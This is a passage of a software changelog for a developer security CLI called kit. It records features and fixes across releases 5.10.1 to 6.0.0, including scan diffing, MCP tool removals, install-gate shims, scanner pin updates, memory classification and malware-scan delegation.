- **`kit check compare <before.json> <after.json>` — run-to-run scan diff.** A baseline
  answers "which findings do I already know about"; it could not answer "what changed since
  Tuesday". Freezing suppresses, it does not compare. Inputs are two existing
  `kit check --json` documents, so no new persistence format and no scan is run:
  `kit check --json > before.json`, later `kit check --json > after.json`, then compare.

  - **Lost coverage ranks above a regression, and that is the whole point.** A naive differ
    reads `fail → skip` as "no longer failing" and calls it an improvement. It is the
    opposite: the check stopped running, so the finding is *unknown*, not fixed. `coverage-lost`
    and `disappeared` are first-class buckets sorted above `regressed`, and a check that
    **could not run** is treated as lost coverage even when its status reads `skip`.
  - Eight movement kinds (`coverage-lost`, `disappeared`, `regressed`, `appeared`,
    `coverage-gained`, `improved`, `resolved`, `unchanged`), each with a one-line deterministic
    summary. Severity movement under an unchanged status counts too — a `high` becoming
    `critical` is a regression.
  - **Pure function of the two documents**: no clock, no filesystem, no network in
    `src/scan-diff.ts`. Same two files always produce the same diff, byte-stable regardless of
    the order checks appear in either array — which is what makes it usable in a gate.
  - Reports by default (it is a report, not a gate). **`--fail-on-worse`** exits non-zero on
    lost coverage, a disappeared check, or a regression, so CI can hold a line on the *delta*
    rather than on the absolute verdict. `--json` emits the whole diff.
  - `clean` deliberately does **not** mean "the second run is green" — two identically failing
    runs diff clean. Documented on the type and covered by a test, because that is exactly the
    misreading the flag invites.
  - A document without a `checks` array is **rejected** rather than diffed: silently comparing
    `{}` against `{}` would report "clean", which is the precise false green this command
    exists to catch.
  - Check identity is `${category}:${name}` — deliberately the same key `findings-track.ts`
    already uses for PAL dedup, so "what changed" and "what is tracked" cannot disagree.
  - Borrowed shape: OpenAI Codex Security's `scans compare BEFORE AFTER`. The coverage axis is
    kit's own (kit-research: `codex-security-openai-vs-kit`).

### Fixed

- **`severity` now survives the `--json` projection for security checks.** `JsonCheck` has
  always declared the field and `checkRunToJsonChecks` silently dropped it, so every
  machine-readable consumer saw findings with no severity. Passed through now.
- **`didNotRun` is carried into `--json`** (new optional field on `JsonCheck`). Without it a
  consumer cannot tell an honest not-applicable skip from a scanner that crashed — i.e. cannot
  tell "stopped failing" from "stopped looking". Additive; absent unless true.


## [6.0.0] - 2026-07-30

The deletion major. 6.0 contains ONE change: the deprecation cycle announced
across the 5.x line completes, and the six deprecated MCP tools leave the
surface. No CLI command changes, no config changes, no new capability — if
you never called those six MCP tools, 6.0 is a no-op upgrade. The major
number exists because semver requires removals to happen in one.

### Removed

- **Six deprecated MCP tools** (`kit_env`, `kit_ci`, `kit_install`,
  `kit_login`, `kit_add`, `kit_standards`) are no longer registered — the MCP
  surface lands at **10 tools**. Their CLI commands are unchanged; only the
  MCP exposure ends, after notice via runtime deprecation markers (since
  5.16, kit_standards since 5.20), the reference/README rows, and the guide.
  Migrations, all shipped before this removal: `kit_review` (with
  `stages`/`category`) covers the standards gate read-only and scoped;
  `kit_context` covers env inspection; `kit_fix` covers tool install;
  `kit_run` remains the escape hatch for setup-time/CI commands (shell
  contexts by definition). The audience exception list in the contract tests
  is deleted — human/harness commands are now MCP-free with NO exceptions —
  and the docs↔surface fiction gate purged the six names from every listing.

### Fixed

- **`READ_ONLY_SAFE` allowlist corrected to the 6.0 truth.** The self-audit
  R8 completeness gate caught that the read-only MCP allowlist still carried
  three removed tools and lacked `kit_review`/`kit_map`/`kit_memory` — exactly
  the drift it exists to catch.

## [5.27.0] - 2026-07-30

### Added

- **`kit guard` — the install gate reaches your own terminal (observe mode).**
  The agent loop was already gated (PreToolUse `gate-bash` across 11
  harnesses), but a human typing `npm i x` / `npx y` / `brew install z` in
  their own shell reached the machine ungated. `kit guard install` writes
  PATH shims for the install + fetch-and-run family (`npm npx pnpm yarn bun
  bunx pip pip3 pipx uv uvx brew gem cargo`) that run the SAME hardened
  parser + triage verdict the agent gate uses, and log what it WOULD decide
  to `~/.kit/guard-observe.jsonl`. v1 is observe-only by the exec-broker
  discipline (observe → evidence → enforce, the 7.0 track): a shim never
  blocks and never breaks the tool — kit missing or crashing means unchanged
  behavior, non-install subcommands pass silently, `KIT_GUARD_BYPASS=1` skips
  observation for one call. Shims are marker-tagged (foreign files never
  clobbered), the shell-rc PATH block is marker-managed and idempotent, and
  `kit guard status` / `uninstall` complete the loop. Verified end-to-end in
  a sandbox with the real generated shims.

## [5.26.0] - 2026-07-28

### Added

- **`kit review` scopes: `--stages` + `--category`.** `collectReview` (and
  therefore both surfaces — `kit review --stages check,standards --category
  general` and the `kit_review` MCP tool's `stages`/`category` params) can run
  a subset of the four gates, canonical order kept regardless of input order.
  Enum-validated: an unknown stage is a refusal with the valid list, never a
  silent full run. `stages: ["standards"]` is the fast, read-only lint loop —
  seconds instead of the full audit's security scan per iteration — and it is
  the migration path that survives `kit_standards`' 6.0 removal (the
  deprecation text now names it). The report stays honest under scoping: `ok`
  covers exactly the stages that ran, and the `stages` array shows the scope.

## [5.25.0] - 2026-07-28

### Added

- **The managed block carries its own bootstrap line.** The README one-liner
  tells an agent how to install kit — but `kit init` replaces it with the
  managed rules block, which said "Start: `kit check`" and nothing about a
  missing binary. The teammate who cloned a kit-managed repo got the block,
  not the line, and their agent met `command not found` and had to guess.
  The block now opens with: if `kit` is missing (fresh clone/machine),
  install it, then continue. The docs↔block drift gate shipped in 5.24.0
  fired on this change exactly as designed and forced the README example to
  follow; kit-public's own CLAUDE.md updated with it (dogfood). Existing
  repos pick the line up on their next `kit agent-config` / `kit init` run
  (the block is idempotent — only the marker-delimited region updates).

## [5.24.0] - 2026-07-28

The adoption release — three pieces that close the "new project, nothing set
up, nobody reminded me" loop: one pasted line lets an agent bootstrap kit
itself, the statusline tells every session in an un-kitted repo what to do
next, and your standing service preferences apply themselves at init.

### Added

- **User-level init defaults.** `~/.kit/defaults.toml` with `[init] services =
  ["sentry", "posthog"]` is merged by BOTH init surfaces (the CLI flow and the
  MCP `kit_init` tool) after stack detection — the operator's standing
  preferences, declared once, outside any repo (personal taste, not project
  truth: the generated `.kit.toml` stays the committed source). Fail-safe by
  construction: missing file is the normal case, malformed toml degrades to no
  defaults, unknown service ids are REPORTED (CLI warn / `unknownDefaults` in
  the MCP response), never silently dropped. `KIT_DEFAULTS_FILE` overrides the
  path (in `kit config knobs`). PostHog joins the service registry as an
  informational service (the resend pattern: detected via its SDKs, env-key
  check, no CLI login) so the default is first-class.
- **Statusline adoption nudge.** `kit:full 1/6` in an un-kitted repo was true
  but actionless. The statusline — and therefore the SessionStart context line
  every harness session gets — now appends the ONE next step from the first
  subsystem gap: `kit:full 1/6 → kit init`, then `→ kit install`,
  `→ kit secrets`, … as adoption progresses. Complete score keeps today's
  output.
- **The one-line agent bootstrap (docs).** Paste one line into
  `CLAUDE.md`/`AGENTS.md` and the next agent session installs kit, runs
  `kit init` (which writes the managed rules block — the one-liner retires
  itself), verifies with `kit check`, and hands the human only the interactive
  steps. With the honest trust-root note: the first install cannot self-triage
  — verify provenance (docs/VERIFY.md) before pasting into an org template.

## [5.23.0] - 2026-07-27

### Changed

- **bumblebee pin bumped 0.1.1 → 0.1.2, with the digests verified by download rather than
  copied.** All four release tarballs were fetched and their SHA-256 recomputed against the
  release's `checksums.txt` (4/4 match); v0.1.1's published checksums were also confirmed to
  equal the digests already embedded here, cross-validating the source.
  - **Threat intel: 6 → 11 catalogs**, newest authoring date 2026-05-18 → 2026-06-18
    (65 → 38 days, under the 60-day staleness threshold, so the advisory clears). Adds
    `glassworm`, `trapdoor-crypto-stealer`, `mastra-2026-06-17`, `laravel-lang-2026-05-23`,
    `mini-shai-hulud-redhat-cloud-services`.
  - **Inventory coverage** widens into kit's own domain: an `agent-skill` ecosystem
    (skills.sh / vercel-labs lock files, including the project-local `skills-lock.json` kit
    already manages), `homebrew` install receipts, and `~/.claude.json` MCP parsing for
    Claude Code's user- and project-scoped servers.

### Fixed

- **Corrected the 5.22.0 claim that a newer bumblebee release brings no fresher threat
  intel.** It does here. The error was methodological and is now recorded in
  `bumblebee-update.ts` so it is not repeated: the six pre-existing catalogs *are*
  byte-identical across the two tags, and `raw.githubusercontent.com` cannot list a
  directory — so comparing only the filenames already known makes five ADDED catalogs
  invisible and looks like "nothing changed". Compare the release tarball, not a guessed
  file list. The suggestion text no longer asserts either direction: whether a bump
  refreshes the catalogs depends on the release, so it points at the evidence instead.


## [5.22.0] - 2026-07-27

### Added

- **Pinned-scanner release notice, and out-of-verdict advisories now reach the PAL ledger.**
  kit reported that bumblebee's threat-intel catalogs were N days old but never whether a
  newer release existed to bump *to* — half a sentence. The other half is now there.

  - **The binary pin stays.** `BUMBLEBEE_VERSION` + `TARBALL_CHECKSUMS` are never
    auto-updated: fetching an executable whose checksum cannot be verified in advance is
    the supply-chain attack kit exists to catch. This is a **notice**, and the bump remains
    a deliberate commit where the two constants move together.
  - **The real defect it exposes** is that the `threat_intel/` catalogs ship *inside* the
    pinned tarball, coupling data with a days-scale half-life to a binary with a
    months-scale one. The notice makes that coupling visible instead of silent.
  - **Not part of any verdict.** Whether upstream cut a release depends on the network and
    someone else's schedule, so letting it move pass/fail would make `kit ci --strict`
    non-deterministic for an unchanged repo — the same reasoning that already keeps catalog
    *age* out of the verdict. The security check reads a **cache only** and never makes a
    network call.
  - **`SecurityCheckResult.advisory`** — a new optional `{ key, title, detail }` for
    signals that must not move the verdict but must still reach a human. Advisories mostly
    ride on `pass` results, which is exactly why `actionableFindings` (fail/warn only)
    could never see them. `advisoryFindings()` bridges them into PAL under their own `adv`
    source tag, so they reconcile independently of `sec` findings — folding them together
    would have made each sync close the other's rows every run. The dedup key deliberately
    excludes the day count, so a climbing age keeps **one** open row instead of opening a
    new one daily, and the row auto-closes once the advisory stops being emitted.
  - **Delivery is the point:** a printed line scrolls out of the terminal, so the signal
    also lands in PAL — persistent, cross-session, and counted in the `kit statusline` ⚠
    badge the session-start hook injects.
  - **Measured against upstream, and the wording follows the measurement:** a newer
    release does NOT imply newer threat intel. All six `threat_intel/*.json` catalogs are
    byte-identical between upstream v0.1.1 and v0.1.2; what v0.1.2 adds is inventory
    *coverage* (an `agent-skill` ecosystem for skills.sh / vercel-labs lock files,
    `homebrew`, and `~/.claude.json` MCP parsing). So neither branch of the suggestion
    promises a bump will refresh the catalogs — the age can be upstream's own data age
    rather than a lagging pin, and the previous "bump to refresh the exposure catalogs"
    wording was a false promise. A *tag* is also not a *release*: the notice reads the
    releases API and skips drafts/prereleases, so a tagged-but-unreleased version
    correctly produces silence.
  - Network posture mirrors kit's own update check exactly, via a now-shared
    `isAirGapPosture()` so air-gap cannot be honored on one notice path and punched
    through on another: 3s timeout, 24h cache, and every failure path (suppressed,
    offline, rate-limited, malformed JSON, unparseable tag) returning null. `KIT_NO_UPDATE_CHECK`,
    `CI`, `GITHUB_ACTIONS`, `GITLAB_CI` and air-gap all suppress it; the notice prints to
    **stderr** so it cannot corrupt piped stdout.


## [5.21.0] - 2026-07-26

### Added

- **Three stack-aware hint rules.** The deterministic hint engine (one tip per
  run, shown once, `KIT_NO_HINTS` silences, fail-safe detectors, zero LLM) now
  also surfaces the right *workflow* at the moment the repo's own state makes
  it relevant: `.github/workflows/` present but never gha-audited → `kit
  gha-audit`; a kit-managed repo with sources but no findings baseline → `kit
  baseline freeze`; agent transcripts on the machine but no memory store →
  `kit memory index`.

### Fixed

- **The a11y/token scanners no longer flag markup in comments.** A commented
  `<input type="datetime-local">` example inside a docstring was reported as an
  unlabeled input, and a hex value in a comment as a token bypass. Comment
  interiors (slash-star blocks incl. the JSX-wrapped form, HTML comments,
  `//` lines — URLs preserved) are now blanked newline-preserving before
  matching, so finding line numbers stay stable. Stripping can only reduce
  findings, so existing baselines stay valid.
- **The pinned-versions check is workspace-aware.** `"@repo/ui": "*"`
  (npm-workspaces convention) and `workspace:`/`file:`/`link:`/`portal:`/
  `catalog:` protocol refs resolve to the local tree, never the registry —
  flagging them as unpinned was a false positive, and "pinning" them would be
  wrong. External `*` and registry ranges still flag exactly as before.
  (Both fixes from a Turborepo user's false-positive report — sharpen the
  matching, never loosen the gates.)
- **Hint tests are host-isolated.** The hints test env now pins
  `KIT_CLAUDE_DIR` and clears `KIT_MEMORY_DB`, so no test can see the host's
  real transcripts or memory store.

## [5.20.0] - 2026-07-26

### Added

- **`kit review` is a structured verdict, not console output.** The meta-runner
  was print-and-return-bool: `--json` emitted four concatenated sub-documents
  (the ADR stage ignored the flag entirely), and nothing machine-readable
  described the audit as a whole. `collectReview` now runs every stage's shared
  gate — check (via the new `runCheckGate` collection core), design
  (`runDesignGate`), standards (`runStandardsGate`), ADR (`runAdrGate`) — and
  returns one `ReviewReport { ok, failed, stages: [{ stage, ok, summary,
  findings }] }`. The CLI is a renderer on top; `kit review --json` emits ONE
  document and exits 1 on red. Same discipline as `computeCheckVerdict`: the
  collection can no longer fork between surfaces. `kit review` is now a pure
  read — `kit check` keeps its CLI extras (PAL sync, attestation, hints,
  scanner self-heal).
- **`kit_review` MCP tool** — the full audit for shell-less agents, serializing
  the same `collectReview` report. `concise: true` drops pass/skip rows while
  per-stage summary counts keep totals honest (nothing silently truncated).

### Deprecated

- **`kit_standards` leaves the MCP surface in kit 6.0** — `kit_review` runs
  that gate as its standards stage; scoped runs (`--category`) go via
  `kit_run`. With the five existing deprecations the surface lands at 10 tools
  after 6.0. Both docs↔surface drift gates updated to pin the six.

### Fixed

- **The hook-skip sentinel's STAMPING half is now tracked.** 5.19.0 shipped the
  post-commit *detector*, but the pre-commit block that writes the sentinel it
  reads existed only machine-locally (via `kit fix`) — so a fresh clone logged
  a false `sentinel-missing` skip on every commit (the 5.18.0 release commit is
  a recorded example). Both halves now travel with the repo. Plus gitignore
  hardening: kit's local state files (`.kit-skipped-commits.jsonl`,
  `.kit-audit.pending`, `.env.local.*`), `.opencode/` alongside the other
  agent-harness dirs, and `.toml`/extensionless-hook variants of the cloud-sync
  conflict-copy patterns.

## [5.19.0] - 2026-07-26

### Fixed

- **The install gate no longer trips on shell redirections.** Found live while
  verifying the 5.18.0 release: the gate blocked the release-verification
  install of `sandstream-kit` itself, because the segment splitter cut on the
  `&` inside stderr-dup redirections (shearing commands into a garbage `2>`
  segment) and redirect tokens like `>/dev/null` reached the package matcher
  and fail-closed legitimate installs. `&` now splits only as a job-control
  separator, and redirections are stripped as I/O plumbing on the undequoted
  token stream — a *quoted* redirect-shaped operand still fail-closes, a
  background `&` still separates segments, and a stderr-dup piped into an
  xargs-driven install keeps its fail-close. Strictly precision, never
  looseness: all 75 existing bypass-resistance tests pass unchanged.

### Added

- **The hook-skip sentinel ships complete.** The tracked pre-commit hook wrote
  the ran-sentinel, but the post-commit *detector* — which flags
  `git commit --no-verify` bypasses to `.kit-skipped-commits.jsonl` — sat
  untracked in the working tree: half a mechanism. Now tracked, and verified
  live (it flagged a rebase commit exactly as designed). Plus `mise.toml`
  pinning node 22 to match `engines.node`.

## [5.18.0] - 2026-07-26

The surface-audit release: asked "does every user-facing surface show what the
mechanism actually does?", the answer was no in four places. All four fixed,
each behind a gate so it cannot silently regress.

### Added

- **kit adopts its own ADR gate.** Three accepted ADRs with enforce blocks now
  gate `kit review` and the pre-commit hook on kit's own repo: ADR-0001
  (zero-LLM core — no LLM SDK imports in `src/`), ADR-0002 (dependency floor —
  utility libraries forbidden, a new runtime dep is an ADR-level decision),
  ADR-0003 (the check path never imports `src/coverage/*` framework mappings,
  keeping them extractable to a plugin). The engine shipped in 5.7–5.10; this
  is the adoption — the same arc as scope-needs, closing the last
  "mechanism without adoption" gap found this session. All three rules
  canary-verified.
- **Docs ↔ MCP drift gate** (`docs-mcp-sync.test.ts`). The MCP docs documented
  a tool set that never shipped (`kit_configure`, `kit_adapter_*`) and missed
  every real tool added since, including `kit_triage` and `kit_memory`. Both
  files are rewritten against the real 15-tool surface, and the gate enforces
  sync in both directions: every `KIT_MCP_TOOLS` entry must appear in the
  reference and the README, and no doc may mention a `kit_*` tool that does
  not exist — fiction is a build failure. The reference must also mark exactly
  the five 6.0-deprecated tools as deprecated.

### Changed

- **`kit help` is audience-filtered.** The five harness commands (`gate-*`,
  `statusline`) are hook stdin protocols the agent harness invokes — never a
  browsing human — so the default listing hides them behind a counted note
  ("+ 5 harness hook commands — see them with `kit help --all`"), never a
  silent drop. `kit help --all` shows everything; `kit help <cmd>` resolves a
  harness command directly regardless. Data-layer help parity is untouched.
- README's MCP section now lists the real tool table with deprecation markers,
  names `kit_triage` instead of the deprecated `kit_add`, and states the
  CLI-first rule. `docs/COMMANDS.md` points agents at the OpenCLI contract
  and documents `x-kit-audience`.

## [5.17.0] - 2026-07-26

Agent-surface hygiene, part two of the exposure arc (5.16.0 fixed WHAT is
exposed; this fixes what each surface COSTS and who it is FOR).

### Added

- **`x-kit-audience` in the OpenCLI contract.** Every command now declares who
  primarily invokes it: `human` (interactive/setup — 28 commands), `harness`
  (hook stdin protocols like the PreToolUse gates and the statusline — 5,
  invoked by the agent harness itself, belonging on no discovery surface),
  or `all` (35). Subcommands inherit their parent's audience. A contract test
  enforces the consistency rule the field exists for: **a human/harness
  command is never MCP-exposed** — with a pinned exception for the three
  already-deprecated tools (`add`, `install`, `login`) that leave in kit 6.0,
  at which point the exception list fails its own rot-check and gets deleted.

### Changed

- **The instruction block kit writes into downstream CLAUDE.md/AGENTS.md files
  is now an index, not an encyclopedia.** Always-loaded instruction files are
  paid for on every request (measured at +20% inference cost with no success
  gain for bloated context files — ETH Zurich, arXiv:2602.11988), so each line
  must survive "would removing it cause mistakes?". The hook-architecture
  paragraph is gone (the gates teach the agent at exactly the moment they
  fire, deterministically), the `kit auth elevate` line is gone (the CLI
  enforces it and says so when hit), and a `kit --help` pointer closes the
  block — discovery on demand at zero standing cost. Applied to kit's own
  repo via `kit agent-config` (dogfood).

## [5.16.0] - 2026-07-26

Two adoption arcs with the same shape: a surface that promised something its
mechanism did not deliver, made honest — and then gated so the dishonesty
cannot return.

### Added

- **Agent-centric MCP surface.** Deep research into agent tool exposure
  (Anthropic context-engineering guidance, MCP schema-cost measurements,
  CLI-vs-MCP evals) concluded kit's MCP list was wrong in both directions.
  Fixed a genuine dead end: the install gate blocks untriaged packages with
  the instruction "run `kit triage` first" — which a shell-less MCP client
  could not follow, because triage was not exposed.
  - **`kit_triage`** — security-triage npm/pip/docker/brew/repo/skill targets.
    A PASS records through the SAME triage-log path the CLI uses, so the
    pre-commit and install gates recognize an MCP-run triage identically.
    Refuses in read-only mode (an unrecordable pass could not satisfy the
    gates anyway — fail-closed).
  - **`kit_memory`** — search cross-session memory + the repo's curated shared
    tier. Search-only by design: writes stay on the CLI/indexer path, so an
    MCP client can never inject foreign text into the trusted store. A missing
    store returns empty rather than materializing a db on read.
  - **Server `instructions`** (MCP initialize): agents WITH shell access should
    prefer the CLI (zero standing context cost; `--help` self-documents);
    canonical loop `check → fix → triage → memory → run`.
  - **Deprecated on the MCP surface** (marked, removal in kit 6.0 per the
    stability policy's notice requirement): `kit_ci`, `kit_install`,
    `kit_login`, `kit_add`, `kit_env`. `kit_run` remains the escape hatch.

- **Scope-needs adoption — kit now dogfoods its own effect declarations.**
  `withGovernance` has checked `scopeNeeds` against the signed `[scope]`/RoE
  since the exec-broker landed — but zero production call sites declared
  anything, making the check a structural no-op on the whole governed CLI
  surface (the MCP broker path was already declared). Now:
  - **`secrets.generate` declares** `fsWrites: [".env.local"]` + the named
    secret keys it materializes. Vault-CLI subprocess egress is deliberately
    NOT claimed (its network I/O is the CLI's, not kit's — same reasoning as
    the MCP site).
  - **`fix` declares** its statically-known repo writes (`skills-lock.json`,
    `cli-lock.json`, `.env.template`, `.gitignore`). Tool installs remain
    infrastructure (mise → `$HOME`), which the project RoE does not govern.
  - **A drift gate makes silence impossible** (`scope-needs-adoption.test.ts`):
    every `withGovernance` / `runGovernedBrokered` call site must declare its
    effects or sit on an explicit reviewed list WITH a reason — an undeclared
    new site is a build failure, never a silent bypass. The reviewed list is
    itself checked against real call sites, so it cannot rot. Same pattern as
    the CLI=MCP guard and the publish-ordering tests.

  Under a signed `[scope]`, the declared needs must be inside the RoE; without
  one, behavior is unchanged (the floor stays advisory). This is increment 2
  of the 6.0 plan ("scopeNeeds adoption BEFORE flipping the default") — the
  first honest field-signal measurement (`kit broker enforce-readiness` on kit
  itself) is now meaningful, because something actually declares.

### Fixed

- **Broker evidence now lands in the governed project's audit log, not
  `process.cwd()`.** The first real `enforce-readiness` measurement found
  23/23 observed ops were test fixtures: broker audits resolved
  `.kit-audit.jsonl` from the process cwd, so an op governed by another
  project's `[scope]` — an MCP call with its own `cwd`, or a test fixture —
  wrote its observe records into the host repo's log and poisoned the
  readiness verdict there. `cwd` now threads through
  `runBrokered → brokerExec/brokerObserve → audit`, so evidence follows the
  project whose scope mediates (regression-tested: the polluter suite now
  leaves the host log untouched). Historical entries are left intact — the
  log is hash-chained, and deleting lines is tampering by kit's own model; a
  sanctioned `audit rotate` with anchor re-seal is a named follow-up.

## [5.15.0] - 2026-07-25

### Added

- **`forbid_import` can now follow a dependency across npm package boundaries.** A transitive
  ADR rule could only see the repo's own relative-import graph, so the most common way an
  architectural boundary is actually broken was structurally invisible: `src/web` imports an
  innocent-looking wrapper package, and the wrapper is what pulls in `pg`. Opt in per rule with
  `follow_packages = true` (requires `transitive = true`):

  ```toml kit-enforce
  [[forbid_import]]
  import = "^pg$"
  paths = "src/web/**/*.ts"
  transitive = true
  follow_packages = true
  message = "the web layer must not reach the DB driver — go through the service layer"
  ```

  The violation is cited to the file the rule governs, with the dependency path in the message
  (`via src/web/h.ts → wrapper/lib/index.js → wrapper/lib/db.js`).

  - **Opt-in, and bounded.** Crossing package boundaries is far more expensive than the in-repo
    walk, so it never happens unless a rule asks. The walk is bounded by package depth
    (default 3), a hard visited-node cap (default 2000), and the existing visited set.
  - **Every hop we cannot complete is a `gap`, never a silent pass.** A bare specifier that
    does not resolve in `node_modules`, a module that resolves but cannot be read, and a walk
    that hits the depth or node bound all downgrade the result from clean-green to *unproven*
    and are reported as such. `kit adr freeze` baselines them like any other finding.
  - **Node builtins stay leaves.** There is no user code behind `node:fs` to walk into, so an
    unfollowed builtin is not a gap — but a rule that forbids one still gates on the direct
    match, because the specifier is tested before we ask whether it is followable.
  - `src/adr.ts` stays **I/O-free**: the `node_modules` resolver is an injected
    `PackageResolver` (fs-backed implementation in `src/commands/adr.ts`), which is what makes
    the bounds, the gap paths, and the entry-point resolution unit-testable against a synthetic
    dependency tree.

## [5.14.0] - 2026-07-25

### Added

- **Memory classification — a restrictive memory can no longer be recalled into a less
  restrictive context (closes #348).** One local store shared across projects and devices meant
  a note captured in a restricted codebase could surface while working in a public one. Every
  memory row now carries a **class**: `public` | `internal` | `restricted`.
  - **Label source** (the decision that unblocked the issue): a config default with a
    **per-project override**. `[memory] default_class` in `.kit.toml` sets it — and because kit
    loads the *project's* `.kit.toml`, a project overrides the inherited default just by
    declaring its own. `KIT_MEMORY_CLASS` overrides both for an ephemeral session.
  - **The gate:** recall (`searchMessages` / `recentMessages`) accepts a `contextClass` and
    returns only rows no more restrictive than it. A row whose class is missing or
    unrecognized is **excluded from every context** — it is simply absent from the allow-list,
    so fail-closed needs no special case.
  - **Deliberately asymmetric fail-closed rules:** a *missing* config value is not a security
    event → the documented default (`internal`); an *invalid* one is (a typo must never
    silently widen disclosure) → `restricted`, flagged `recognized: false`. A row that cannot
    be classified at disclosure time → treated as `restricted`.
  - Schema v9 adds `messages.class` and backfills pre-existing rows to the configured default
    (leaving them NULL would make historical memory permanently invisible — data loss dressed
    as security). New rows are classified at insert; none is born unclassifiable.
  - Policy lives in pure functions (`src/memory/class.ts`) with unit tests that need no DB,
    plus integration tests proving the gate against a real SQLite store.

### Fixed

- **The v9 backfill can no longer brick `kit memory`.** `messages` is the external-content
  source for the `messages_fts` index, and its update trigger re-indexes `content` on *any*
  write — so a plain backfill `UPDATE` would rewrite the whole FTS index for a column FTS does
  not index, and on a store whose index is already inconsistent it raises
  `database disk image is malformed`, which from inside `openMemoryDb` would take down every
  memory command. The backfill now drops that single trigger for its duration, restores it in a
  `finally`, and is best-effort: on failure rows keep a NULL class and are excluded by the gate
  (fail-closed) instead of the CLI failing to open the store at all.

## [5.13.0] - 2026-07-25

### Added

- **`kit security scan-artifact <path>` — the ingestion gate for an untrusted artifact.**
  Scans a file (or a tree with `--recursive`) via the ClamAV delegate before you trust an
  upload, a downloaded dataset, or a vendored blob. `clean` passes; `malicious` fails with the
  signature names; and a **gap** — scan error, or no scanner installed — **also fails**. That is
  the point of an ingestion gate: "we could not check" must never read as "it is fine".
  `--json` for machine consumption.
- **clamd (daemon) fast path for the malware delegate.** The delegate now prefers `clamdscan`
  against a resident `clamd`, which already holds the signature DB — milliseconds instead of the
  ~4 s `clamscan` spends loading 3.6M signatures on every invocation. When the daemon is absent
  or unreachable kit **falls back to `clamscan`**, so a stopped daemon costs speed, not coverage,
  and the result reports which `engine` actually produced the verdict (`clamd` | `clamscan`)
  rather than leaving the operator to guess. `--fdpass` is passed to the daemon so it can scan
  files its own uid could not otherwise read (which would otherwise look like a false gap).

### Changed

- **The ClamAV exit-code contract is now empirically verified on all three paths.** 5.11.0
  shipped with `exit 0` (clean) and `exit 2` (scan error) confirmed against a real host but
  `exit 1` (malicious) taken from ClamAV's documented spec, because macOS quarantined the EICAR
  test file before `clamscan` could read it. Scanning a **gzipped** EICAR instead closes that
  gap: `clamscan --no-summary /tmp/e.gz` → `/tmp/e.gz: Eicar-Test-Signature FOUND`, exit `1`.
  That output is now a byte-exact test fixture, so the parser is pinned to real observed output
  rather than an assumption.
- **The gVisor fingerprint is verified against a live sandbox, and gained a second signal.**
  5.9.0 shipped the gVisor/Firecracker fingerprints as documentation-derived, resolving to
  `unknown` rather than risk a false claim. Running `runsc do` (gVisor release-20260721.0 on
  Ubuntu 24.04) settles it:
  - `/proc/version` reads `Linux version 4.19.0-gvisor #1 SMP …` — the existing marker **does**
    fire, and is now pinned as a byte-exact fixture with real-host negative controls (a plain
    container kernel, an Ubuntu VM, and the host DMI `product_name` gVisor passes through).
  - The sandbox reports **`Seccomp: 0`** and no `NoNewPrivs` line at all. That makes the branch
    ORDER load-bearing: were seccomp/container evaluated first, a genuine gVisor sandbox would
    resolve to `none` / not-contained — a false negative on the strongest sandbox available. A
    test now locks the ordering.
  - New `cgroupHasGvisorJobController` adds a second, independent signal (gVisor synthesizes a
    `job` cgroup controller that does not exist on Linux — observed as `5:job:/`), so a build
    whose version string lacks the marker is still detected instead of degrading to
    "not contained". Anchored to the `N:job:` shape so a real path segment named `job` cannot
    trip it.
  - The `dmesg` marker (`Starting gVisor...`) was also observed but deliberately **not** used as
    the primary signal — reading it needs the syslog syscall / `/dev/kmsg`, which a hardened
    sandbox may deny. Documented in the source for the next person.

  Firecracker remains documentation-derived and honestly unverified (no Firecracker host was
  available; Hetzner Cloud is KVM/QEMU).

## [5.12.0] - 2026-07-25

### Added

- **`kit coverage --standard=nist-800-53` — NIST SP 800-53 Rev. 5 evidence map.** The
  accreditation-oriented first slice of the regulated-edition track (#349). Mapped at the
  **control-family** level (all 20 Rev. 5 families) rather than per-control: 800-53 has ~1000
  controls, and pretending a local CLI speaks to each would be a false green. A family bucketed
  `auto` means kit emits deterministic evidence relevant to that family — **never** that every
  control in it is satisfied.
  - `auto` (11): AC, AU, CA, CM, IA, PT, RA, SA, SC, SI, SR — each citing the actual kit checks
    (signed scope + PreToolUse gates, hash-chained audit, profile drift, hardware-rooted
    identity, merged scanner verdict, triage/SBOM/provenance, OS-containment posture, the
    ClamAV byte-scan delegate, …).
  - `manual` (3): IR, PL, PM — kit ships real capability (`kit panic`, the ADR gate,
    policy-as-code) but no check can verify that a human *program* exists.
  - `n-a` (6): AT, CP, MA, MP, PE, PS — physical/personnel/organizational by nature and
    deliberately out of charter, stated rather than quietly claimed.

  Still an evidence map, not an attestation and not an ATO package.

### Fixed

- **Coverage disclaimers no longer emit "control familys".** The shared standard engine
  pluralized a descriptor's `unit` with a naive `+ "s"`, which broke on units ending in
  consonant + `y`. New `pluralizeUnit` handles that (and sibilant endings); user-facing text now
  reads "control families".

## [5.11.0] - 2026-07-25

### Added

- **`kit triage model --scan-bytes` — malware-scan delegate (ClamAV).** The byte-level layer
  beneath the model/dataset format+provenance triage. Connect-don't-copy: kit ships **no**
  scanning engine and **no** signatures — it invokes a locally-installed ClamAV (`clamscan`) and
  records the verdict. Contract (verified against ClamAV 1.5.3 on a real host — exit 0/2 paths
  empirically, exit 1 per ClamAV's documented, stable spec): **exit 0 → clean**, **exit 1 →
  malicious** (signature names parsed from `<path>: <SIGNATURE> FOUND`), **exit 2/other →
  scanerror**, **binary absent → not-installed**. A `malicious` result forces an overall
  **fail**; a `scanerror` / missing scanner is a **gap** — surfaced, never a silent clean
  (absence of a scan is not a pass). Without `--scan-bytes` the byte layer is skipped (kit does
  not auto-run a multi-second scan). New pure `interpretClamscan` + `scanFileForMalware` in
  `src/malware-scan.ts`. Honest limit: kit does not *detect* malware — it records that a verified
  ClamAV scan ran and what it returned; signature-based AV is known-malware-only.

## [5.10.1] - 2026-07-25

A maintenance release. No new commands, no behaviour changes to any gate — the
user-visible part is better error diagnostics. Its real purpose is to be the
first release that exercises the repaired publish pipeline end to end.

### Fixed

- **Rethrows now preserve the original error.** Ten `catch` blocks interpolated
  the caught error's _message_ into a new `Error` but dropped the error itself,
  so the original stack was lost. Each now passes `{ cause }`. The ones that
  mattered: `database.ts` swallowed the driver error on all four paths (connect,
  query, transaction, migration) — a failing migration reported its own name and
  nothing about _why_ — and the deliberately fail-closed paths in
  `memory/sync.ts` and `memory/install.ts`, where losing the cause makes a
  refusal hard to diagnose, which is the opposite of what a fail-closed gate
  wants. `audit-anchor.ts`, `baseline.ts`, `keystore/command-store.ts`, and
  `memory/backup.ts` got the same treatment.

### Changed

